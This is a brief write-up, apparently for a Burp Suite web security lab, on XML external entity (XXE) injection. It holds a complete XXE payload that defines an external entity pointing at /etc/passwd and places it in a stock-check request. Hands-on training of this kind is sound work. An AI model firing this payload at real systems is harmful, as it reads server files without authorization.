Exploiting XXE using external entities to retrieve files

The solution provided by Burp labs is great. If you can't see the contents of /etc/passwd by intercepting and changing the request, try sending it to repeater and repeating tha attack.

Payload:
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
